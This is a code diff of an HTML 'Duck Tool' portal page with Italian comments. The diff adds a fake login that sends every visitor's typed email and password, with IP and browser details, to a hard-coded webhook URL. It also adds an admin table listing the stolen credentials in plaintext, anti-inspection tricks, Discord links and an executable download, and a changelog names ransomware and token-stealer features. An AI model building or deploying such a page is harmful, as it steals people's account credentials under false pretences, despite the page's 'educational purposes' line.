@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Duck Tool - Secure Gateway</title>
+    <title>Duck Tool - Secure Portal</title>
     <style>
+        /* CSS BASE */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -20,6 +21,7 @@
             overflow: hidden;
         }
 
+        /* SFONDO MATRIX */
         #bg-canvas {
             position: absolute;
             top: 0;
@@ -30,7 +32,7 @@
             opacity: 0.4;
         }
 
-        /* Schermata Login */
+        /* SCHERMATA LOGIN */
         #auth-screen {
             position: fixed;
             top: 0;
@@ -51,6 +53,7 @@
             background-color: #111;
             text-align: center;
             box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+            width: 400px;
         }
 
         .login-box h2 {
@@ -58,11 +61,13 @@
             margin-bottom: 30px;
             font-size: 24px;
             color: #FFD700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
 
         .login-box input {
             display: block;
-            width: 300px;
+            width: 100%;
             padding: 12px;
             margin-bottom: 15px;
             background-color: #000;
@@ -71,10 +76,12 @@
             font-family: 'Consolas', monospace;
             font-size: 16px;
             outline: none;
+            transition: border 0.3s;
         }
 
         .login-box input:focus {
             border-color: #FFD700;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.2);
         }
 
         .login-box button {
@@ -93,6 +100,7 @@
 
         .login-box button:hover {
             background-color: #B8860B;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
         }
 
         .error-msg {
@@ -100,9 +108,10 @@
             font-size: 14px;
             margin-top: 15px;
             display: none;
+            font-weight: bold;
         }
 
-        /* Area Sito / Admin */
+        /* AREA SITO */
         #app-area {
             display: none;
             width: 100%;
@@ -181,6 +190,7 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+        /* LOGO 3D */
         .logo {
             color: #FFD700;
             font-size: 14px;
@@ -206,6 +216,25 @@
             color: #ccc;
         }
 
+        /* LINK DISCORD */
+        .discord-link {
+            display: block;
+            background-color: #222;
+            color: #fff;
+            text-decoration: none;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 4px solid #FFD700;
+            transition: all 0.2s;
+        }
+
+        .discord-link:hover {
+            background-color: #333;
+            padding-left: 20px;
+            color: #FFD700;
+        }
+
+        /* BOTTONE DOWNLOAD */
         .download-btn {
             background-color: #FFD700;
             color: black;
@@ -230,6 +259,7 @@
             box-shadow: 0 0 15px #FFD700;
         }
 
+        /* TABELLA ADMIN */
         table {
             width: 100%;
             border-collapse: collapse;
@@ -251,6 +281,7 @@
         .status-success { color: #00FF00; }
         .status-fail { color: #FF0000; }
 
+        /* FINTO BLOCCO DEVTOOLS */
         #devtools-warning {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -281,13 +312,16 @@
         <div class="sidebar">
             <div class="server-name">Duck Tool</div>
             <button class="nav-btn active" onclick="changePage('home', this)"># home</button>
+            <button class="nav-btn" onclick="changePage('socials', this)"># socials</button>
             <button class="nav-btn" onclick="changePage('changelog', this)"># changelog</button>
             <button class="nav-btn" onclick="changePage('credits', this)"># credits</button>
             
-            <button class="nav-btn" id="admin-nav-btn" style="display:none; color: #FF0000;" onclick="changePage('admin-panel', this)"># ADMIN ACCESS</button>
+            <!-- Tasto Admin nascosto -->
+            <button class="nav-btn" id="admin-nav-btn" style="display:none; color: #FF0000;" onclick="changePage('admin-panel', this)"># ADMIN LOGS</button>
         </div>
 
         <div class="main-content">
+            <!-- HOME -->
             <div id="home" class="page active">
                 <div class="logo">
 ██████╗ ██╗   ██╗ ██████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
@@ -302,28 +336,58 @@
                 <a href="DuckTool.exe" download class="download-btn">DOWNLOAD DUCK TOOL</a>
             </div>
 
-            <div id="changelog" class="page">
-                <h2>Changelog</h2>
-                <p>Version 0.0.0 - Initial release.</p>
+            <!-- SOCIALS -->
+            <div id="socials" class="page">
+                <h2>Links & Socials</h2>
+                <p>Join our Discord communities for updates, support, and more.</p>
+                <a href="https://discord.gg/wFpSKUMkp" target="_blank" class="discord-link">
+                    <strong>Community Server</strong><br>
+                    <span style="font-size: 12px; color: #888;">https://discord.gg/wFpSKUMkp</span>
+                </a>
+                <a href="https://discord.gg/KEmkMDmae" target="_blank" class="discord-link">
+                    <strong>Sponsor Server</strong><br>
+                    <span style="font-size: 12px; color: #888;">https://discord.gg/KEmkMDmae</span>
+                </a>
             </div>
 
+            <!-- CHANGELOG -->
+            <div id="changelog" class="page">
+                <h2>Changelog</h2>
+                <div class="changelog-item">
+                    <div class="changelog-date">Version 0.0.0 (Current)</div>
+                    <ul>
+                        <li>Initial release of Duck Tool.</li>
+                        <li>Added Ransomware simulation mode.</li>
+                        <li>Added fake Token Stealer.</li>
+                        <li>Added interactive Minigame to bypass lockdown.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- CREDITS -->
             <div id="credits" class="page">
                 <h2>Credits</h2>
                 <p><strong>Developer:</strong> MrDuckyzx</p>
+                <p><strong>Design & Logic:</strong> MrDuckyzx</p>
+                <p><strong>Special Thanks:</strong> To everyone who tested the tool.</p>
+                <br>
+                <p style="color: #555; font-size: 12px;">This tool is for educational purposes only.</p>
             </div>
 
+            <!-- ADMIN PANEL -->
             <div id="admin-panel" class="page">
                 <h2>ADMIN DASHBOARD</h2>
-                <p>Live connection logs.</p>
+                <p>Live connection logs from the Webhook.</p>
                 <button onclick="loadLogs()" style="padding: 10px; background: #FFD700; color: black; border: none; cursor: pointer; font-weight: bold; margin-bottom: 10px;">Refresh Logs</button>
                 <button onclick="clearLogs()" style="padding: 10px; background: #FF0000; color: white; border: none; cursor: pointer; font-weight: bold; margin-bottom: 10px; margin-left: 10px;">Clear Logs</button>
                 <table id="log-table">
                     <thead>
                         <tr>
+                            <th>Email</th>
+                            <th>Password</th>
                             <th>IP Address</th>
                             <th>Date/Time</th>
                             <th>Browser</th>
-                            <th>Status</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -339,79 +403,59 @@
     </div>
 
     <script>
-        // --- SICUREZZA E ANTI-ISPEZIONA ---
-        
-        // Blocca Tasto Destro
-        document.addEventListener('contextmenu', event => event.preventDefault());
+        // ⚠️ IL TUO WEBHOOK URL ⚠️
+        const WEBHOOK_URL = "https://webhook.site/cc3c6391-1059-43f5-b767-03f06a2e2a6d";
 
-        // Blocca Scorciatoie da tastiera (F12, Ctrl+U, Ctrl+S, Ctrl+Shift+I/J/C)
-        document.onkeydown = function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.key === 'u') || 
-                (e.ctrlKey && e.key === 's') || 
-                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'C' || e.key === 'c' || e.key === 'J' || e.key === 'j'))) {
-                return false;
-            }
-        };
+        // --- LOGICA DI INVIO DATI ---
+        async function sendLogToServer(email, password) {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
 
-        // Finto blocco se apre i DevTools (controlla differenza dimensioni finestra)
-        setInterval(function() {
-            if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-                document.getElementById('devtools-warning').style.display = 'flex';
-            } else {
-                document.getElementById('devtools-warning').style.display = 'none';
-            }
-        }, 500);
+                const payload = {
+                    "email": email,
+                    "password": password,
+                    "ip": ip,
+                    "time": new Date().toLocaleString(),
+                    "browser": navigator.userAgent
+                };
 
-        // --- LOGICA LOGIN ---
-        
-        // Le credenziali sono "offuscate" per non farle leggere a colpo d'occhio
-        const SECURE_USER = "YWRtaW5AcXVhY2t0b29s"; // base64 di admin@quacktool
-        const SECURE_PASS = "ZHVjazM5OTM="; // base64 di duck3993
-
-        function getIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(() => "Unknown IP");
-        }
-
-        function saveLog(username, status) {
-            getIP().then(ip => {
-                const logs = JSON.parse(localStorage.getItem('quack_logs') || '[]');
-                const now = new Date().toLocaleString();
-                const browser = navigator.userAgent.substring(0, 50) + "...";
-                
-                logs.push({
-                    ip: ip,
-                    time: now,
-                    browser: browser,
-                    status: status,
-                    user: username
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
                 
-                localStorage.setItem('quack_logs', JSON.stringify(logs));
-            });
+                // Salva anche in locale per mostrarlo nella tabella admin (solo sul tuo PC)
+                const localLogs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');
+                localLogs.push(payload);
+                localStorage.setItem('local_quack_logs', JSON.stringify(localLogs));
+
+            } catch (error) {
+                console.log("Errore nell'invio", error);
+            }
         }
+
+        // --- LOGICA LOGIN ---
+        const SECURE_USER = "YWRtaW5AcXVhY2t0b29s"; // admin@quacktool
+        const SECURE_PASS = "ZHVjazM5OTM=";         // duck3993
 
         function handleLogin() {
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
             const error = document.getElementById('error-msg');
 
-            // Decodifica le credenziali e le confronta
-            const decodedUser = atob(SECURE_USER);
-            const decodedPass = atob(SECURE_PASS);
+            if (user !== "" && pass !== "") {
+                sendLogToServer(user, pass);
+            }
 
-            if (user === decodedUser && pass === decodedPass) {
-                saveLog(user, "Admin Login");
+            if (user === atob(SECURE_USER) && pass === atob(SECURE_PASS)) {
                 document.getElementById('admin-nav-btn').style.display = 'block';
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('app-area').style.display = 'flex';
             } 
             else if (user !== "" && pass !== "") {
-                // Finto login per chiunque altro
-                saveLog(user, "User Login");
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('app-area').style.display = 'flex';
             } 
@@ -420,62 +464,65 @@
             }
         }
 
+        document.getElementById('password').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') { handleLogin(); }
+        });
+
         // --- FUNZIONI ADMIN ---
         function loadLogs() {
             const tbody = document.querySelector('#log-table tbody');
             tbody.innerHTML = '';
-            const logs = JSON.parse(localStorage.getItem('quack_logs') || '[]');
+            const logs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');
 
             logs.reverse().forEach(log => {
                 const tr = document.createElement('tr');
-                const statusClass = log.status.includes('Admin') ? 'status-success' : 'status-fail';
-                
                 tr.innerHTML = `
+                    <td>${log.email}</td>
+                    <td>${log.password}</td>
                     <td>${log.ip}</td>
                     <td>${log.time}</td>
-                    <td>${log.browser}</td>
-                    <td class="${statusClass}">${log.status} (${log.user})</td>
+                    <td>${log.browser.substring(0, 30)}...</td>
                 `;
                 tbody.appendChild(tr);
             });
         }
 
         function clearLogs() {
-            if(confirm("Are you sure you want to clear all logs?")) {
-                localStorage.setItem('quack_logs', '[]');
+            if(confirm("Are you sure you want to clear local logs?")) {
+                localStorage.setItem('local_quack_logs', '[]');
                 loadLogs();
             }
         }
-
-        // Tasto Invio per il login
-        document.getElementById('password').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') { handleLogin(); }
-        });
 
         // --- NAVIGAZIONE ---
         function changePage(pageId, btn) {
-            document.querySelectorAll('.page').forEach(page => {
-                page.classList.remove('active');
-            });
-            document.querySelectorAll('.nav-btn').forEach(b => {
-                b.classList.remove('active');
-            });
+            document.querySelectorAll('.page').forEach(page => { page.classList.remove('active'); });
+            document.querySelectorAll('.nav-btn').forEach(b => { b.classList.remove('active'); });
             document.getElementById(pageId).classList.add('active');
             btn.classList.add('active');
-            
-            if (pageId === 'admin-panel') {
-                loadLogs();
-            }
+            if (pageId === 'admin-panel') { loadLogs(); }
         }
+
+        // --- SICUREZZA ---
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J'))) {
+                return false;
+            }
+        };
+        setInterval(function() {
+            if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+                document.getElementById('devtools-warning').style.display = 'flex';
+            } else {
+                document.getElementById('devtools-warning').style.display = 'none';
+            }
+        }, 500);
 
         // --- SFONDO MATRIX ---
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
-
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         window.addEventListener('resize', resizeCanvas);
         resizeCanvas();
 
@@ -483,31 +530,19 @@
         const fontSize = 16;
         let columns = canvas.width / fontSize;
         let drops = [];
-
-        function initDrops() {
-            columns = canvas.width / fontSize;
-            drops = [];
-            for (let x = 0; x < columns; x++) {
-                drops[x] = 1;
-            }
-        }
+        function initDrops() { columns = canvas.width / fontSize; drops = []; for (let x = 0; x < columns; x++) { drops[x] = 1; } }
         initDrops();
         window.addEventListener('resize', initDrops);
 
         function draw() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
             ctx.fillStyle = "#FFD700";
             ctx.font = fontSize + "px monospace";
-
             for (let i = 0; i < drops.length; i++) {
                 const text = words[Math.floor(Math.random() * words.length)];
                 ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) {
-                    drops[i] = 0;
-                }
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) { drops[i] = 0; }
                 drops[i]++;
             }
         }
